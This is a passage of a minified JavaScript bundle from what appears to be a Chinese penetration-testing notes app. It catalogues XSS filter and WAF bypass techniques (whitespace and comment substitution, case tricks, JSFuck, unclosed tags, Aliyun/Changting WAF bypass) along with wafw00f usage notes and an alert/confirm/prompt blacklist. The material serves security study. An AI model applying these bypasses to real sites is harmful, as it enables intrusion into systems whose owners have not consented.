data:\u3010\u534F\u8BAE/\u5B50\u540D\u3011;\u3010base64,\u7F16\u7801\u5B57\u7B26\u3011")))])),{},{children:[]})]}),Object(E.a)(Object(E.a)({},Object(F.a)(a.HTML5)),{},{children:[Object(E.a)(Object(E.a)({},Object(F.a)(a["\u65B0 \u6807\u7B7E"])),{},{children:[]}),Object(E.a)(Object(E.a)({},Object(F.a)(a["\u65B0 \u4E8B\u4EF6/\u5C5E\u6027"])),{},{children:[]})]}),Object(E.a)(Object(E.a)({},Object(F.a)(a.\u6807\u7B7E\u540D)),{},{children:[Object(E.a)({},Object(F.a)(a["\u5927\u5C0F\u5199\u4E0D\u654F\u611F\u3001\u5927\u5C0F\u5199\u6DF7\u5199"],["\u6807\u7B7E\u540D\uFF0C\u5B8C\u5168\u4E0D\u533A\u5206\u5927\u5C0F\u5199\uFF1B\u4F60\u53EF\u4EE5\u4EFB\u610F\u7684\u3010\u5927\u5C0F\u5199\u6DF7\u5199\u3011"]))]}),Object(E.a)({},Object(F.a)(a["\u975E\u6807\u51C6\u5B57\u6BCD\u3001\u82F1\u6587\u4EE5\u5916\u7684\u5B57\u6BCD"],["\u603B\u7ED3\uFF0C\u5404\u79CD\u5947\u8469\u3010\u5B57\u6BCD\u3011\uFF1B \u4EE5\u53CA\uFF0C\u6D4F\u89C8\u5668\u7684\u5947\u8469\u3010\u8F6C\u6362\u89C4\u5219\u3011",e.a.createElement("ol",null,e.a.createElement("li",null,Object(F.c)("\u53E4\u82F1\u8BED\u4E2D\uFF0C\u3010\u017F\u3011\u662F\u3010s\u5B57\u6BCD\u3011\u7684\u5199\u6CD5"),"\u3002",e.a.createElement("ol",null,e.a.createElement("li",null,"\u5C0F\u5199\u65F6\uFF0C\u3010\u017F\u3011 \u65E0\u6CD5\u8BC6\u522B"),e.a.createElement("li",null,"\u8F6C\u6362\u6210 \u5927\u5199 \u65F6\uFF0C\u3010\u017F\u3011\u53D8\u6210\u4E86\u3010S\u5B57\u6BCD\u3011\u3002",Object(F.c)("\u6B64\u65F6\u53EF\u4EE5\u8BC6\u522B")))))])),Object(E.a)(Object(E.a)({},Object(F.a)(a["\u6362\u884C\u7B26\u3001\u56DE\u8F66\u7B26\u3001\u7A7A\u683C\u7B26\u3001\u5236\u8868\u7B26\u3001\u6362\u9875\u7B26\u3001NUL\u7B26\u53F7"])),{},{children:[Object(E.a)(Object(E.a)({},Object(F.a)(a.\u6362\u884C\u7B26,[e.a.createElement("div",null,"LF\u6362\u884C (Line Feed)",e.a.createElement("ol",null,e.a.createElement("li",null,"%0A"),e.a.createElement("li",null,"\\n"))),e.a.createElement("div",null,"\u4EFB\u610F\uFF08HTML\u6807\u7B7E\u7684\uFF09JS\u8BED\u6CD5\u4E2D\uFF1A",Object(F.c)("innerHTML\u503C\u3001attribute\u503C\u3001script\u5185\u5BB9\u503C\uFF0C\u7686\u53EF"),e.a.createElement("ol",null,e.a.createElement("li",null,"\u2460 javascript\u534F\u8BAE"),e.a.createElement("li",null,"\u2461 \u5192\u53F7"),e.a.createElement("li",null,"\u7B49\u7B49")),"HTML\u6807\u7B7E\u5185\uFF0C\u5C5E\u6027\u5916\uFF1A",e.a.createElement("ol",null,e.a.createElement("li",null,"\u3010\u6807\u7B7E\u540D\u3011\u4E2D\uFF0C\u53EA\u80FD\u5728 \u540D\u5B57\u6BCD \u548C \u53F3\u95ED\u5408 \u4E4B\u95F4\uFF0C\u4F7F\u7528\u3010\u6362\u884C\u3011\u624D\u4F1A\u6709\u6548")),"\u539F\u7406\uFF1A",e.a.createElement("ol",null,e.a.createElement("li",null,"\u89E3\u6790\u5F15\u64CE\uFF1A\u53EF\u4EE5\u4F7F\u7528\u6362\u884C\u7B26\u6765\u7ED5\u8FC7\uFF0C\u56E0\u4E3AJavascript\u901A\u5E38\u4EE5\u5206\u53F7\u7ED3\u5C3E\u3002",e.a.createElement("ol",null,e.a.createElement("li",null,"\u5982\u679C\u89E3\u6790\u5F15\u64CE\u80FD\u786E\u5B9A\u4E00\u4E2A\u8BED\u53E5\u65F6\u5B8C\u6574\u7684\uFF0C\u4E14\u884C\u5C3E\u6709\u6362\u884C\u7B26\uFF0C\u5219\u5206\u53F7\u53EF\u7701\u7565"),e.a.createElement("li",null,"\u800C\u5982\u679C\u4E0D\u662F\u5B8C\u6574\u7684\u8BED\u53E5\uFF0Cjavascript\u5219\u4F1A\u7EE7\u7EED\u5904\u7406\uFF0C\u76F4\u5230\u8BED\u53E5\u5B8C\u6574\u7ED3\u675F\u6216\u5206\u53F7")))))])),{},{children:[]}),Object(E.a)({},Object(F.a)(a.\u56DE\u8F66\u7B26,[e.a.createElement("div",null,"\u56DE\u8F66 (Carriage Return)",e.a.createElement("ol",null,e.a.createElement("li",null,"%0D"),e.a.createElement("li",null,"\\r")))])),Object(E.a)(Object(E.a)({},Object(F.a)(a.\u7A7A\u683C\u7B26,[e.a.createElement("div",null,"\u7A7A\u683C",e.a.createElement("ol",null,e.a.createElement("li",null,"%20"),e.a.createElement("li",null)))])),{},{children:[Object(F.d)(a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"],a.\u5BF9\u7F16\u7801\u654F\u611F\u7684\u7B26\u53F7),Object(E.a)({},Object(F.a)(a["\u4F7F\u7528\u3010/**/\u6CE8\u91CA\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011"],[e.a.createElement("div",null,B["\u683C\u5916\u64C5\u957F\u7684\u89E3\u9898\u9886\u57DF\uFF1A"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u5728",B["\u3010script block js\u3011"],"\u4E2D\uFF0C\u7A7A\u683C\u88AB\u5C4F\u853D\u65F6\uFF0C\u7528\u3010/**/\u3011\uFF0C\u53EF\u4EE5\u4EE3\u66FF"),e.a.createElement("li",null,"\u5728",a["function\u58F0\u660E\uFF0C\u524D\u7F6E\u7279\u6027"],"\u4E2D\uFF0Cfunction\u58F0\u660E\uFF0C\u7A7A\u683C\u88AB\u5C4F\u853D\u65F6\uFF0C\u7528\u3010/**/\u3011\uFF0C\u53EF\u4EE5\u4EE3\u66FF")))])),Object(E.a)({},Object(F.a)(a["\u4F7F\u7528\u3010\u6362\u9875\u7B26 0x0c \f\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011"]))]}),Object(E.a)({},Object(F.a)(a.\u5236\u8868\u7B26,[e.a.createElement("div",null,"\u5236\u8868\u7B26",e.a.createElement("ol",null,e.a.createElement("li",null,"\u6C34\u5E73",e.a.createElement("ol",null,e.a.createElement("li",null,"%09"),e.a.createElement("li",null,"\\t"))),e.a.createElement("li",null,"\u5782\u76F4",e.a.createElement("ol",null,e.a.createElement("li",null,"%0B"),e.a.createElement("li",null,"\\v"))))),e.a.createElement("div",null)])),Object(E.a)({},Object(F.a)(a.\u6362\u9875\u7B26,[e.a.createElement("div",null,"\u6362\u9875\u7B26\uFF08Form Feed\uFF09",e.a.createElement("ol",null,e.a.createElement("li",null,"%0C"),e.a.createElement("li",null,"0x0c"),e.a.createElement("li",null,"\\f")))])),Object(E.a)({},Object(F.a)(a.NUL\u7B26\u53F7,[e.a.createElement("div",null,"NUL\u7B26\u53F7 (null character)",e.a.createElement("ol",null,e.a.createElement("li",null,"%00"),e.a.createElement("li",null,"\\0")))]))]}),Object(E.a)(Object(E.a)({},Object(F.a)(a.\u6CE8\u91CA,["\u4E0D\u5BF9\u79F0\u6CE8\u91CA\uFF1A",e.a.createElement("ol",null,e.a.createElement("li",null,"<!-- \u5185\u5BB9\uFF0C\u540E\u9762\u4E0D\u5BF9\u79F0 -->")),"\u5BF9\u79F0\u6CE8\u91CA\uFF1A",e.a.createElement("ol",null,e.a.createElement("li",null,"<!-- \u5185\u5BB9\uFF0C\u540E\u9762\u5BF9\u79F0 --!>")),"JS\u5185\uFF0C\u591A\u6837\u5316\u7684\u3010\u5355\u884C\u6CE8\u91CA\u3011",e.a.createElement("ol",null,e.a.createElement("li",null,"// \u5185\u5BB9"),e.a.createElement("li",null,"/* \u5185\u5BB9 */"),e.a.createElement("li",null,"<!--"," \u5185\u5BB9"),e.a.createElement("li",null,"-->"," \u5185\u5BB9"))])),{},{children:[]}),Object(E.a)(Object(E.a)({},Object(F.a)(a["\u4E0D\u5B8C\u6574\u6807\u7B7E\u3001\u4E0D\u95ED\u5408\u6807\u7B7E"],[e.a.createElement("div",null,"\u79D2\u6740\uFF1A\u5BF9\u3010\u5B8C\u6574\u95ED\u5408\u6807\u7B7E\u3011\u7684\u68C0\u67E5"),e.a.createElement("div",null,"\u539F\u7406\uFF1A",e.a.createElement("ol",null,e.a.createElement("li",null,"html\u7684\u5BB9\u9519\u6027\u5F88\u9AD8\uFF0C\u5BF9\u4E8E\u6807\u7B7E\u4E0D\u95ED\u5408\u4E5F\u53EF\u4EE5\u63A5\u53D7")))])),{},{children:[]})]})]}),Object(E.a)(Object(E.a)({},Object(F.a)(a.HTML\u6807\u7B7E\u5185\u90E8\u5C5E\u6027,[e.a.createElement("div",null,B.\u6982\u5FF5,e.a.createElement("ol",null,e.a.createElement("li",null,B["\u3010html inline js\u3011"],"\uFF1Ahtml\u884C\u5185\u4EE3\u7801"))),e.a.createElement(e.a.Fragment,null,"WAF\uFF0C\u5BF9",B["\u3010html inline js\u3011"],"\u505A\u8F6C\u4E49\uFF0C\u5C31\u662F\u65E0\u7528\u529F ",Object(F.c)("\u4F46\u662F\uFF0C\u5BF9<script>\u7684innerHTML\uFF0C\u505A\u8F6C\u4E49\uFF0C\u5C31\u662F\u6709\u6548\u7684"),e.a.createElement("ol",null,e.a.createElement("li",null,"\u6D4F\u89C8\u5668\u4F1A\u5148\u89E3\u6790\u3010html\u3011\uFF1B\u7136\u540E\u518D\u89E3\u6790\u3010js\u3011 ",Object(F.c)("\u89E3\u6790\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u4F1A\u89E3\u7801"))))])),{},{children:[Object(E.a)({},Object(F.a)(a.\u5E38\u7528\u8BED\u53E5)),Object(E.a)(Object(E.a)({},Object(F.a)(a.bypass\u7ED5\u8FC7)),{},{children:[Object(E.a)(Object(E.a)({},Object(F.a)(a.src\u5C5E\u6027)),{},{children:[Object(E.a)({},Object(F.a)(a["\u3010\u9650\u5B9Aurl\u3011\u7684 @\u7279\u6027 \u4F7F\u7528"],[e.a.createElement("ol",null,e.a.createElement("li",null,"\u6709\u65F6\u5019\uFF0C\u5F00\u5934\u9650\u5B9A\u4E86\uFF0C\u53EF\u4EE5\u7528\u3010@\u3011\u6A21\u62DF\u3010\u767B\u5F55\u534F\u8BAE\u3011\u3002\u4EE5\u6539\u53D8\u3010\u4E3B\u57DF\u540D\u3011\u3002",Object(F.c)("\u4EC5 FireFox \u53EF\u7528")))])),Object(E.a)({},Object(F.a)(a.URL\u5927\u5C0F\u5199,["\u901A\u8FC7\u3010URL\u3011\u8BBF\u95EE\u8D44\u6E90\uFF0C\u90FD\u662F\u5927\u5C0F\u5199\u4E0D\u654F\u611F\u7684\u3002",e.a.createElement("div",null,B["\u683C\u5916\u64C5\u957F\u7684\u89E3\u9898\u9886\u57DF\uFF1A"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u5927\u5C0F\u5199\u8F6C\u6362\u7684\u5E72\u6270")))]))]}),Object(E.a)({},Object(F.a)(a.JSFuck,[e.a.createElement("div",null,B["\u683C\u5916\u64C5\u957F\u7684\u89E3\u9898\u9886\u57DF\uFF1A"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u7ED5\u8FC7\u3010\u67D0\u4E9B\u5B57\u6BCD\u3011\u68C0\u6D4B"),e.a.createElement("li",null,"\u7ED5\u8FC7\u3010\u5927\u5C0F\u5199\u8F6C\u6362\u3011\u68C0\u6D4B")),B["\u7F3A\u70B9\uFF1A"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u4E00\u4E2A\u3010print(1)\u3011\uFF0C\u751F\u6210\u30102345\u3011\u4E2A\u957F\u5EA6")),B["\u6539\u826F\uFF1A"],e.a.createElement("ol",null,e.a.createElement("li",null,h.l.singleATag_blank("\u901A\u8FC7\u5236\u5B9A\uFF0C\u4E2A\u4EBA\u6700\u5C0F\u5316\u5B57\u7B26\u96C6\uFF0C\u6765\u7F29\u51CF\u957F\u5EA6","https://nosec.org/home/detail/3047.html"))))])),Object(E.a)({},Object(F.a)(a["\u5BF9\u3010html inline js\u3011\u7684\u8F6C\u4E49"],["\u5929\u751F\u5C31\u53EF\u4EE5bypass\uFF0C\u4E0D\u9700\u8981\u7BA1\u5B83"]))]})]}),Object(E.a)(Object(E.a)({},Object(F.a)(a.\u5757\u7EA7JS\u4EE3\u7801\u5185,[e.a.createElement("div",null,B.\u6982\u5FF5,e.a.createElement("ol",null,e.a.createElement("li",null,B["\u3010script block js\u3011"],"\uFF1AScript\u5757\u7EA7JS")))])),{},{children:[Object(E.a)({},Object(F.a)(a.eval\u76F8\u5173)),Object(E.a)({},Object(F.a)(a["error\u62A5\u9519\u3001Exception\u62A5\u9519"],[e.a.createElement("div",null),e.a.createElement("div",null,h.l.singleATag_blank("\u90E8\u5206\u8BED\u53E5\u53C2\u8003\u8D44\u6599","https://esdiscuss.org/topic/hacking-onerror-throw"))])),Object(E.a)({},Object(F.a)(a["function\u58F0\u660E\uFF0C\u524D\u7F6E\u7279\u6027"],[e.a.createElement("div",null,B["\u683C\u5916\u64C5\u957F\u7684\u89E3\u9898\u9886\u57DF\uFF1A"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u5728",B["\u3010script block js\u3011"],"\u4E2D\uFF0C\u63D0\u524D\u7528\u5230\u53D8\u91CF\uFF0C\u4F1A\u62A5\u3010undefined\u9519\u8BEF\u3011\u65F6")))])),Object(F.d)(a.\u6CE8\u91CA,a.\u7EAFHTML\u5185),Object(E.a)({},Object(F.a)(a.\u5B57\u7B26\u4E32\u53D8\u91CF,["\u3010\u5B57\u7B26\u4E32\u53D8\u91CF\u3011",e.a.createElement("ol",null,e.a.createElement("li",null,"\u4E00\u822C\uFF0C\u8981\u7531\u3010\u4EFB\u4E00\u62EC\u53F7\u5BF9\u3011\u5305\u88F9"),e.a.createElement("li",null,"\u3010\u5E38\u89C4\u5B57\u7B26\u4E32\u3011\uFF0C\u53EF\u4EE5\u7528\u3010\\\u3011\u7B26\u53F7\uFF0C\u6765\u5212\u5206\u3010\u591A\u884C\u3011\u3002"))]))]}),Object(E.a)(Object(E.a)({},Object(F.a)(a.Electron\u5E94\u7528,[e.a.createElement("div",null,B.\u6982\u5FF5,e.a.createElement("ol",null,e.a.createElement("li",null,"--")))])),{},{children:[Object(E.a)({},Object(F.a)(a.\u57FA\u672CElectron\u8BED\u53E5,[e.a.createElement("div",null,B.\u6982\u5FF5,e.a.createElement("ol",null,e.a.createElement("li",null,"--")))])),Object(E.a)({},Object(F.a)(a.DOM\u963B\u585E\u5668,[e.a.createElement("div",null,B.\u6982\u5FF5,e.a.createElement("ol",null,e.a.createElement("li",null,"--")))])),Object(E.a)({},Object(F.a)(a["\u672C\u5730\u8FC7\u6EE4\u5668\uFF08XSS Filter\uFF09"],[e.a.createElement("div",null,B.\u6982\u5FF5,e.a.createElement("ol",null,e.a.createElement("li",null,"--")))])),Object(E.a)({},Object(F.a)(a.MarkDown\u8D85\u94FE\u63A5,[e.a.createElement("div",null,B.\u6982\u5FF5,e.a.createElement("ol",null,e.a.createElement("li",null,"--")))]))]}),Object(E.a)({},Object(F.a)(a["\u7ED5\u8FC7\u963F\u91CC\u4E91\u3001\u957F\u4EADWAF"],[e.a.createElement("div",null,B.\u6982\u5FF5,e.a.createElement("ol",null,e.a.createElement("li",null,"--")))]))]})];var j=function(){function s(){Object(g.a)(this,s)}return Object(c.a)(s,null,[{key:"checkBlackList",value:function(i){var f=this;i.forEach(function(P){f.blackList.forEach(function(D){var C=P.value.toLocaleLowerCase(),M=D.toLocaleLowerCase(),L=C.includes(M)}),P.children&&f.checkBlackList(P.children)})}}]),s}();j.blackList=["alert","confirm","prompt"],y.placePayloads(),j.checkBlackList(y.options);var v=[Object(E.a)({},Object(F.b)("\u3010\u91CD\u70B9\u3011\u9ED1\u5BA2\u4E16\u754C",[e.a.createElement("div",null,h.l.singleATag_blank("\u3010\u91CD\u70B9\u3011\u9ED1\u5BA2\u4E16\u754C","https://www.kdocs.cn/p/113835915920"))]))];function x(s,o,i){return s.split(o).map(function(f,P){return P===0?f:[e.a.createElement("span",{className:"".concat(i,"-menu-item-keyword"),key:"seperator"},o),f]})}function T(s,o){if(h.l.check_isString(s))return String(s);var i=JSON.stringify(s);if(o){var f;i=((f=i.match(o))===null||f===void 0?void 0:f.join("      ||||      "))||"\u65E0"}return i}var R=function(o){function i(D,C){var M,L=(M=C[C.length-1])===null||M===void 0?void 0:M.trim();switch(L&&Object(h.j)(L),D){case"inputPoint":break;case"payload":y.saveSelect_Payload(C);break;case"trueExample":break;default:break}}function f(D){return D[D.length-1]}var P={className:m.a.cascaderInputWra,dropdownClassName:m.a.cascaderDropdown_wra};return e.a.createElement("div",{className:m.a.xssTree},e.a.createElement("h1",null,"\u8F93\u5165\u70B9"),e.a.createElement(t.a,Object(l.a)({},P,{options:p,expandTrigger:"hover",displayRender:f,onChange:function(C){i("inputPoint",C)}})),e.a.createElement("h1",null,"\u5B50\u5F39payload"),e.a.createElement("div",{style:{display:"flex"}},e.a.createElement(t.a,Object(l.a)({},P,{style:{marginLeft:"auto",width:"50%"},options:y.options,expandTrigger:"hover",displayRender:f,onChange:function(C){i("payload",C)},showSearch:{filter:function(C,M){return M.some(function(L){var J=L.label;if(!J)throw new Error("\u672A\u586B\u5199label");var q=T(J).toLowerCase();return q.indexOf(C.toLowerCase())>-1})},sort:function(C,M,L,J){return 1},render:function(C,M,L,J){return M.map(function(q,V){var tu=T(q[J.label],/"(title)":"((\\"|[^"])*)"/i),Y=tu.indexOf(C)>-1?x(tu,C,L):tu;return V===0?Y:[" / ",Y]})}},defaultValue:y.loadSelect_Payload()}))),e.a.createElement("h1",null,"\u771F\u5B9E\u6848\u4F8B"),e.a.createElement(t.a,Object(l.a)({},P,{options:I,expandTrigger:"hover",displayRender:f,onChange:function(C){i("trueExample",C)}})),e.a.createElement("h1",null,"\u601D\u8DEF\uFF0C\u601D\u8DEF\u79EF\u6DC0"),e.a.createElement(t.a,Object(l.a)({},P,{options:v,expandTrigger:"hover",displayRender:f,onChange:function(C){i("ideas",C)}})))}},AkKX:function(H,d,n){"use strict";n.d(d,"a",function(){return l});var S=n("q1tI"),t=n.n(S),l={\u4E0D\u4E8C\u6B21\u72AF\u9519_KEY:{\u5BC6\u7801_\u53CA\u7834\u89E3:`
  \u3010pass\u3011\u3001\u3010password\u3011\u3001\u3010\u5BC6\u7801\u3011\u3001\u3010\u5BC6\u7801\u7834\u89E3\u3011\u3001\u3010Cracker\u3011\u3001
  \u3010secret\u3011\u3001\u3010authentication\u3011\u3001\u3010auth\u3011\u3001
  `,\u679A\u4E3E_\u539F\u7406_\u751F\u6548\u672C\u8D28:t.a.createElement("pre",null,`
  \u4EBA\u7684\u60F3\u8C61\u529B\u662F\u6709\u9650\u7684\u3002\u6240\u4EE5\u603B\u4F1A\u9AD8\u5EA6\u7684\u91CD\u590D
      \u6709\u610F\u590D\u7528\uFF1B\u6216\u65E0\u77E5\u89C9 \u65E0\u610F\u7684\u590D\u7528
  `)},\u6E17\u900F\u6D4B\u8BD5:"\u6E17\u900F\u6D4B\u8BD5"}},B5J2:function(H,d,n){"use strict";n.d(d,"a",function(){return E}),n.d(d,"b",function(){return p});var S=n("fWQN"),t=n("q1tI"),l=n.n(t),r=n("ysNt"),e=n("6CFD"),u=n("jJ7j"),m=r.l.singleATag_blank,E=function I(){Object(S.a)(this,I)};E["\u5C0F\u9ED1\u5206\u4EAB\u7684\u300A\u9AD8\u7EA7\u6280\u5DE7\u300B"]=`
  \u5C0F\u9ED1\u5206\u4EAB\u7684\u300A\u9AD8\u7EA7\u6280\u5DE7\u300B\uFF1A
      1.\u300ASQL\u6CE8\u5165\u76F8\u5173 - Geekby's Blog\u300B             https://www.geekby.site/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/#3-%E5%88%A4%E6%96%AD-sql-%E6%B3%A8%E5%85%A5
      2.\u300AXSS \u6F0F\u6D1E\u76F8\u5173 - Geekby's Blog\u300B            https://www.geekby.site/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/#5-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87
      3.\u300AWEB\u6F0F\u6D1E-XSS\u8DE8\u7AD9\u4E4B\u4EE3\u7801\u7ED5\u8FC7\u4E0EhttpOnly\u7ED5\u8FC7\u300B    https://blog.csdn.net/weixin_45441315/article/details/119718207
      4.\u300A\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u76F8\u5173 - Geekby's Blog\u300B         https://www.geekby.site/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/
      5.\u300ACSRF\u6F0F\u6D1E\u76F8\u5173 - Geekby's Blog\u300B            https://www.geekby.site/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/#11-cookie-%E7%9B%B8%E5%85%B3
      6.\u300ASSRF \u6F0F\u6D1E\u76F8\u5173 - Geekby's Blog\u300B           https://www.geekby.site/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/#21-ip-%E7%BB%95%E8%BF%87
      7.\u300AWAF Bypass - Geekby's Blog\u300B            https://www.geekby.site/2022/03/waf-bypass/#bypass-%E6%80%9D%E8%B7%AF---%E8%BF%9B%E9%98%B6
  `;var F={name:"\u3010\u9632\u706B\u5899\u3011_\u3010Waf\u3011_\u624B\u518C",steps:[{name:"\u3010fragroute\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("fragroute \uFF08\u73B0\u5728\u597D\u50CF\u5DF2\u88AB\u79FB\u9664\uFF09","	\u5C06 \u8DEF\u7531\u3001\u6570\u636E\u5305 \u5206\u6BB5","	fragroute <\u57DF\u540D\u3001IP>"))},{name:"\u3010wafw00f\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("wafw00f \uFF08\u8BC6\u522BWAF\u7684\u5B58\u5728\uFF09","	wafw00f -l","		\u5217\u51FA\u5DF2\u6536\u5F55\u7684WAF\u5217\u8868","	wafw00f <\u57DF\u540D\u3001IP\u3001\u5E26\u534F\u8BAE\u7684url\u3001\u5E26\u7AEF\u53E3\u7684url>","		\u68C0\u67E5","		\u3010-a\u3011\uFF0C\u67E5\u627E\u6240\u6709\u7684\u7279\u5F81\uFF0C\u800C\u4E0D\u662F\u5F53\u7B2C\u4E00\u4E2A\u68C0\u67E5\u5230\u5C31\u505C\u4E0B","	\u68C0\u6D4B\u7ED3\u679C\uFF1A","		1.\u51E1\u662F\u5E26\u3010Error\u3011\u7684\u68C0\u6D4B\u7ED3\u679C\uFF0C\u90FD\u4E0D\u53EF\u4FE1\u3002","		2.\u68C0\u6D4B\u6848\u4F8B\uFF1A","			\u3010zhihu.com\u3011\u3001\u3010baidu.com\u3011\u3001\u3010qq.com\u3011\uFF0C\u88AB\u8BC6\u522B\u51FA\u6709 \uFF08\u90A3\u51E0\u4E4E\u4E00\u5B9A\u5C31\u6709\uFF09","			\u3010google.com\u3011\u6CA1\u6709 \uFF08\u90A3\u600E\u4E48\u53EF\u80FD\u6CA1\u6709\uFF1F\u4E00\u5B9A\u662F\u6F0F\u62A5\u4E86\u5427\uFF09","			\u301010.10.10.28\u3011\u9776\u673A\uFF0C\u4E0D\u5B58\u5728WAF\u3002"))},{name:"\u770B\u56FE\u8BC6\u3010WAF\u3011_\u6536\u96C6\u5E38\u89C1WAF\u3010\u62E6\u622A\u9875\u9762\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(e.a.\u770B\u56FE\u8BC6WAF_\u6536\u96C6\u5E38\u89C1WAF\u62E6\u622A\u9875\u9762))}]},p=F},"CIs/":function(H,d,n){H.exports=n.p+"static/fantasy_1.81dd8537.png"},CW61:function(H,d,n){"use strict";n.d(d,"a",function(){return g});var S=n("oBTY"),t=n("tJVT"),l=n("9og8"),r=n("fWQN"),e=n("mtLc"),u=n("WmNS"),m=n.n(u),E=n("EUZL"),F=n.n(E),p=n("FW8I"),I=n("q4c3"),g=function(){function c(){Object(r.a)(this,c)}return Object(e.a)(c,null,[{key:"trackKeyWords",value:function(){var h=Object(l.a)(m.a.mark(function a(B){var O;return m.a.wrap(function(b){for(;;)switch(b.prev=b.next){case 0:return b.next=2,c.ExcelToJSON(B);case 2:return O=b.sent,b.abrupt("return",this.extract_keyword_from_fullTextString____\u9002\u7528\u4E8E\u539F\u7248\u5F88\u4E45\u4EE5\u524D\u7684\u6F0F\u6D1E\u67E5\u627E\u7CFB\u7EDF(O,I.a));case 4:case"end":return b.stop()}},a,this)}));function w(a){return h.apply(this,arguments)}return w}()},{key:"extract_keyword_from_fullTextString____\u6700\u65B0\u7684\u7591\u96BE\u6742\u75C7",value:function(w,a){return this.extract_keyword_from_fullTextString____\u9002\u7528\u4E8E\u539F\u7248\u5F88\u4E45\u4EE5\u524D\u7684\u6F0F\u6D1E\u67E5\u627E\u7CFB\u7EDF(w,a)}},{key:"extract_keyword_from_fullTextString____\u9002\u7528\u4E8E\u539F\u7248\u5F88\u4E45\u4EE5\u524D\u7684\u6F0F\u6D1E\u67E5\u627E\u7CFB\u7EDF",value:function(w,a){function B(_,b){var y=[],j,v=[];do j=b.keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5.exec(_),j&&v.push({index:j.index,text_index_1:j[1],text_index_2:j[2]});while(j);return v.length>0&&y.push({keyWCfg:b,occurs:v}),y}var O=[];return Object.entries(a).forEach(function(_){var b=Object(t.a)(_,2),y=b[0],j=b[1];j.keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5=p.a.prepareRegExp_\u5C06\u6B63\u5219\u6216\u7C7B\u6B63\u5219\u5B57\u7B26\u4E32_\u5C3D\u53EF\u80FD\u8F6C\u4E49\u540E_\u8F6C\u4E3A\u6B63\u5219(j.keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5),O.push.apply(O,Object(S.a)(B(w,j)))}),O}},{key:"ExcelToJSON",value:function(w){return new Promise(function(a,B){var O=new FileReader;O.onload=function(_){var b,y=_==null||(b=_.target)===null||b===void 0?void 0:b.result,j=F.a.read(y,{type:"binary"});j.SheetNames.forEach(function(v,x){var T=F.a.utils.sheet_to_csv(j.Sheets[v]);a(T)})},O.onerror=function(_){B(_)},O.readAsBinaryString(w)})}}]),c}()},DFOY:function(H,d,n){"use strict";var S=n("wx14"),t=n("rePB"),l=n("U8pU"),r=n("KQm4"),e=n("q1tI"),u=n("TSYQ"),m=n.n(u),E=n("ODXe"),F=n("Ff2n"),p=n("18yb"),I=n("NvD2"),g=n("6cGi"),c=n("LdHM"),h=n("VTBJ"),w=e.createContext(null),a=w,B="__RC_CASCADER_SPLIT__";function O(A){return A.join(B)}function _(A){return A.map(O)}function b(A){return A.split(B)}function y(A){var W=A||{},k=W.label,z=W.value,Q=W.children,Z=z||"value";return{label:k||"label",value:Z,key:Z,children:Q||"children"}}function j(A,W){var k,z;return(k=A.isLeaf)!==null&&k!==void 0?k:!((z=A[W.children])===null||z===void 0?void 0:z.length)}function v(A){var W=A.parentElement;if(!!W){var k=A.offsetTop-W.offsetTop;k-W.scrollTop<0?W.scrollTo({top:k}):k+A.offsetHeight-W.scrollTop>W.offsetHeight&&W.scrollTo({top:k+A.offsetHeight-W.offsetHeight})}}function x(A,W){var k=new Set(A),z=W();return A.filter(function(Q){var Z=z[Q],uu=Z?Z.parent:null;return!(uu&&!uu.node.disabled&&k.has(uu.key))})}function T(A,W,k){for(var z=arguments.length>3&&arguments[3]!==void 0?arguments[3]:!1,Q=W,Z=[],uu=function(cu){var Bu,Au,yu,G=A[cu],K=(Bu=Q)===null||Bu===void 0?void 0:Bu.findIndex(function(X){var ou=X[k.value];return z?String(ou)===String(G):ou===G}),N=K!==-1?(Au=Q)===null||Au===void 0?void 0:Au[K]:null;Z.push({value:(yu=N==null?void 0:N[k.value])!==null&&yu!==void 0?yu:G,index:K,option:N}),Q=N==null?void 0:N[k.children]},nu=0;nu<A.length;nu+=1)uu(nu);return Z}function R(A){var W,k=A.prefixCls,z=A.checked,Q=A.halfChecked,Z=A.disabled,uu=A.onClick,nu=e.useContext(a),iu=nu.checkable,cu=typeof iu!="boolean"?iu:null;return e.createElement("span",{className:m()("".concat(k),(W={},Object(t.a)(W,"".concat(k,"-checked"),z),Object(t.a)(W,"".concat(k,"-indeterminate"),!z&&Q),Object(t.a)(W,"".concat(k,"-disabled"),Z),W)),onClick:uu},cu)}var s="__rc_cascader_search_mark__",o=function(W,k,z){var Q=z.label;return k.some(function(Z){return String(Z[Q]).toLowerCase().includes(W.toLowerCase())})},i=function(W,k,z,Q){return k.map(function(Z){return Z[Q.label]}).join(" / 